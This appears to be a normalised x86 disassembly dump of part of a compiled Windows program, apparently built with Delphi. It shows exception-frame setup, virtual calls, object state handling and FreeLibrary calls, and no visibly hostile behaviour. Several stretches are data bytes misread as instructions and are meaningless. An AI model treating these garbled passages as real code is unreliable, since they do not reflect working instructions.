call [ edx + 0x7c ]
sub_427ed4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4137ac
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4137ac
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_427f60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_428029
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_427e5c
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_427c18
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428030
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4137ac
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4137ac
pop edx
call sub_438a70
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_428038
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43e714
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4137ac
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_4280ac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_42cfd0
mov edx r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax edi
call sub_4198bc
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
test bl bl
je r-xdata
mov edx [ esi + 0x8 ]
mov eax edi
call sub_438a70
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_42811d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov ebx eax
mov eax ebx
call sub_42d304
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov dl [ eax + 0x224 ]
call sub_4282cc
sub_42816c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_428168
push eax
push esi
mov eax ebx
call sub_428164
push eax
mov eax ebx
call sub_428160
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop esi
pop ebx
retn
sub_42819c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_42815c
push eax
mov eax ebx
call sub_428164
push eax
mov eax ebx
call sub_428160
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop esi
pop ebx
retn
sub_4281cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42d618
mov [ esi + 0x224 ] 0x0
mov [ esi + 0x228 ] 0x3
mov eax esi
call sub_4284b4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_428238
push esi
mov esi eax
mov eax esi
call sub_43e714
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
pop esi
retn
sub_428274
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_437f10
cmp esi [ edi + 0x220 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
sub_4282a4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43ec14
mov dl [ ebx + 0x224 ]
mov eax ebx
call sub_4282cc
pop ebx
pop ebp
retn 0x8
sub_4282cc
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x220 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esi + 0x224 ] dl
sub dl 0x1
jb r-xdata
mov eax [ esi + 0x220 ]
call sub_42815c
mov edx [ esi + 0x44 ]
sub edx eax
sub edx [ esi + 0x228 ]
mov ecx esp
mov eax [ esi + 0x40 ]
call sub_412350
jmp r-xdata
je r-xdata
mov ebx [ esi + 0x220 ]
mov eax ebx
call sub_428168
push eax
mov eax [ esi + 0x220 ]
call sub_42815c
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov ecx esp
mov edx [ esi + 0x44 ]
add edx [ esi + 0x4c ]
add edx [ esi + 0x228 ]
mov eax [ esi + 0x40 ]
call sub_412350
jmp r-xdata
dec dl
je r-xdata
mov eax [ esi + 0x220 ]
call sub_42815c
mov edx [ esi + 0x4c ]
sub edx eax
sar edx 0x1
jns r-xdata
dec dl
je r-xdata
add edx [ esi + 0x44 ]
push edx
mov eax [ esi + 0x220 ]
call sub_428168
push eax
mov eax [ esi + 0x40 ]
pop edx
sub eax edx
sub eax [ esi + 0x228 ]
lea ecx [ esp + 0x4 ]
pop edx
call sub_412350
jmp r-xdata
adc edx 0x0
mov eax [ esi + 0x220 ]
call sub_42815c
mov edx [ esi + 0x4c ]
sub edx eax
sar edx 0x1
jns r-xdata
jmp r-xdata
add edx [ esi + 0x44 ]
mov ecx esp
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
add eax [ esi + 0x228 ]
call sub_412350
adc edx 0x0
sub_4283ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_428472
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_438828
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebx + 0x220 ]
call sub_4389b4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428479
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
xor edx edx
mov eax ebx
call sub_438a70
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_438a70
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_438a40
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_407b34
test eax eax
jne r-xdata
sub_428480
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438914
mov edi [ ebx + 0x220 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax [ ebx + 0x220 ]
call sub_438960
sub_4284b4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280ac
mov esi eax
mov [ ebx + 0x220 ] esi
mov edx ebx
mov eax esi
call sub_41921c
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_42d418
sub_4284f0
xchg esi eax
inc esi
add [ eax ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ 0x640000ff ] ah
xchg esi eax
inc esi
add [ esi ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ 0x640000ff ] ch
xchg esi eax
inc esi
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ 0x640000ff ] dl
xchg esi eax
inc esi
add [ esi ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ 0x640000ff ] bl
xchg esi eax
inc esi
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ 0x640000ff ] al
xchg esi eax
inc esi
add [ esi ] al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ 0x640000ff ] cl
xchg esi eax
inc esi
add [ esi ] cl
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ ecx + edi * 2 ] bh
inc esi
add [ eax - 0x7a ] ah
inc edx
add [ ecx + edi * 2 ] dh
inc esi
add [ eax - 0x7a ] bl
inc edx
add [ ecx + edi * 2 ] ch
inc esi
add [ eax - 0x7a ] dl
inc edx
add [ ecx + edi * 2 ] ah
inc esi
add [ eax - 0x7a ] cl
inc edx
add [ ecx + edi * 2 ] bl
inc esi
add [ eax - 0x7a ] al
inc edx
add [ ecx + edi * 2 ] dl
inc esi
add [ eax ] bh
xchg [ edx ] al
or al 0x79
inc esi
add [ eax ] dh
xchg [ edx ] al
add al 0x79
inc esi
add [ eax ] ch
xchg [ edx ] al
cld
js r-xdata
js r-xdata
add [ eax ] ah
xchg [ edx ] al
hlt
js r-xdata
add al bl
test [ edx ] eax
lodsb [ esi ]
js r-xdata
js r-xdata
add [ eax + 0x64004285 ] dl
js r-xdata
add al dl
test [ edx ] eax
movsb [ edi ] [ esi ]
js r-xdata
ja r-xdata
add [ eax - 0x7b ] cl
inc edx
add [ eax + edi * 2 ] bl
inc esi
js r-xdata
add [ eax + 0x5c004285 ] cl
js r-xdata
add al cl
test [ edx ] eax
pushfd
js r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428827
add [ eax ] al
test [ edx ] eax
aam 0x77
inc esi
inc [ rw-data ]
jne r-xdata
add [ eax ] ah
test [ edx ] eax
hlt
ja r-xdata
add [ eax - 0x7b ] al
inc edx
add [ eax + edi * 2 ] dl
inc esi
js r-xdata
add [ eax + 0x54004285 ] al
js r-xdata
add al al
test [ edx ] eax
xchg esp eax
js r-xdata
xor eax eax
pop edx
mov eax rw-data
mov ecx 0x2f
inc edx
add bl al
jmp sub_403994
add al bh
test [ edx ] al
int3
ja r-xdata
add [ eax ] bh
test [ edx ] eax
or al 0x78
inc esi
js r-xdata
add [ eax - 0x7b ] bh
inc edx
add [ eax + edi * 2 + 0x46 ] cl
js r-xdata
add [ eax - 0x73ffbd7b ] bh
js r-xdata
jmp r-xdata
add al dh
test [ edx ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
add [ eax ] dh
test [ edx ] eax
add al 0x78
inc esi
js r-xdata
add [ eax - 0x7b ] dh
inc edx
add [ eax + edi * 2 + 0x46 ] al
js r-xdata
add [ eax - 0x7bffbd7b ] dh
js r-xdata
retn
mov [ fs : eax ] esp
inc edx
add [ edi + edi * 8 + 0x30 ] ah
add [ eax ] ch
test [ edx ] eax
cld
ja r-xdata
add [ eax - 0x7b ] ch
inc edx
add [ eax + edi * 2 ] bh
inc esi
js r-xdata
add [ eax + 0x7c004285 ] ch
js r-xdata
ja r-xdata
add [ eax - 0x7b ] ah
inc edx
add [ eax + edi * 2 ] dh
inc esi
js r-xdata
add [ eax + 0x74004285 ] ah
js r-xdata
add [ eax ] bl
test [ edx ] eax
in al dx
ja r-xdata
add [ eax - 0x7b ] bl
inc edx
add [ eax + edi * 2 ] ch
inc esi
js r-xdata
add [ eax + 0x6c004285 ] bl
mov edx [ r-xdata ]
add [ eax ] al
add [ eax ] dl
test [ edx ] eax
in al 0x77
inc esi
ja r-xdata
add [ eax - 0x7b ] dl
inc edx
add [ eax + edi * 2 ] ah
inc esi
call sub_404a0c
add [ eax ] cl
test [ edx ] eax
fdiv [ edi + 0x46 ]
sub_42885c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428881
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428888
retn
sub_428894
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4288c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4288cc
retn
mov eax [ rw-data ]
call sub_403258
sub_42897c
or al [ eax ]
add [ eax ] al
push 0x80004679
add [ esi ] 0x0
add [ eax ] al
add [ ecx + edi * 2 + 0x46 ] ah
add [ edi + edi * 2 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] ah
inc esi
add [ eax ] dl
jg r-xdata
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x46 ] bl
add ah bl
jg r-xdata
mov eax sub_42897c
call sub_403d64
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c64
retn
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_428a24
push [ fs : eax ]
mov [ fs : eax ] esp
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] bl
inc esi
add [ eax + eax * 4 + 0x46 ] ch
add [ eax ] al
push esp
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428a2b
retn
call sub_428960
inc [ rw-data ]
jne r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
add [ edx + eax * 4 + 0x46 ] ah
add [ eax ] al
push eax
jns r-xdata
add [ eax ] al
add [ ecx + edi * 2 + 0x46 ] al
add [ eax ] dh
add al ah
add [ esi ] 0x0
add [ eax ] al
add [ ecx + edi * 2 + 0x46 ] cl
add [ ecx + eax * 4 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] cl
inc esi
add [ eax + 0x4682 ] cl
sub_428a58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428a7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428a84
retn
sub_428a9f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_428ae4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428aeb
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a0c
sub_428b07
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_428b4c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b53
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a0c
sub_428b63
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428bb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428bc0
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f90
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_428bcc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428c10
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c17
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_428c24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428c49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c50
retn
sub_428c5c
test al 0x8c
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x400428c ] dh
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx * 4 - 0x72b7ffbe ] dh
inc edx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_428dcb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428dd2
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049c0
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049c0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_428d5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428dcb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428dd2
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049c0
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049c0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_429024
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_4241b0
mov [ esi + 0x5 ] al
call sub_428cfc
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_429868
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_429070
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_429110
call sub_423ff0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4290a4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_429110
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_429154
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4290a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4291a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4290a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4291e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_4290a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42924c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4047dc
push eax
mov eax esi
call sub_4047cc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_4290a4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4292b0
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_429334
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_429370
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42938d ]
jmp [ eax * 4 + jump_table_4293f6 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
